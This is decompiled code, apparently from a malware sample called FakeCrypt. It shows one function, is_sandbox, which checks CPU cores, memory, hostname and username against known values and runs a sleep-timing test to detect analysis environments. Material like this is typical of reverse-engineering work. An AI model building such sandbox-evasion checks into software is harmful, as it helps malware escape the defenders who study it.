long long FakeCrypt::stealth::is_sandbox()
{
    char v0;  // [bp-0x218], Other Possible Types: unsigned long long
    unsigned int v1;  // [bp-0x210], Other Possible Types: unsigned long long
    unsigned long long v2;  // [bp-0x208]
    char v3;  // [bp-0x200]
    unsigned long long v4;  // [bp-0x1f8]
    unsigned long long v5;  // [bp-0x1f0]
    char v6;  // [bp-0x1e8]
    char v7;  // [bp-0x1d0]
    char v8;  // [bp-0x68]
    unsigned long long v10;  // rbx
    unsigned long v11;  // rdx

    v7.new_all();
    v10 = &v7 & 0xffffffffffffff00 | 1;
    if (((char)sysinfo::common::System::physical_core_count() & 1) && v11 >= 2 && *((long long *)&v8) >= 0x200000)
    {
        hostname::get(&v0);
        v3.unwrap_or_default(&v0);
        v0.from_utf8_lossy(v4, v5);
        alloc::str::<impl str>::to_lowercase(&v6, v1, v2);
        core::ptr::drop_in_place<alloc::borrow::Cow<str>>(&v0);
        ::0x44f7a0::core::ptr::drop_in_place<std::ffi::os_str::OsString>(&v3);
        v0 = &g_4d91f0;
        v1 = &g_4d9230;
        if (!v0.any(&v6))
        {
            whoami::api::username(&v0);
            alloc::str::<impl str>::to_lowercase(&v3, &g_4d9230, v2);
            ::0x44f720::core::ptr::drop_in_place<alloc::string::String>(&v0);
            v0 = &g_4d9230;
            v1 = &g_4d9260;
            if (!v0.any(&v3))
            {
                v0 = std::time::Instant::now();
                v1 = v11;
                std::thread::sleep(2, 0);
                if (v0.elapsed() >= 2)
                {
                    ::0x44f720::core::ptr::drop_in_place<alloc::string::String>(&v3);
                    ::0x44f720::core::ptr::drop_in_place<alloc::string::String>(&v6);
                    core::ptr::drop_in_place<sysinfo::common::System>(&v7);
                    return 0;
                }
            }
            ::0x44f720::core::ptr::drop_in_place<alloc::string::String>(&v3);
        }
        v10 = v10 & 0xffffffffffffff00 | 1;
        ::0x44f720::core::ptr::drop_in_place<alloc::string::String>(&v6);
    }
    core::ptr::drop_in_place<sysinfo::common::System>(&v7);
    return v10 & 4294967295;
}
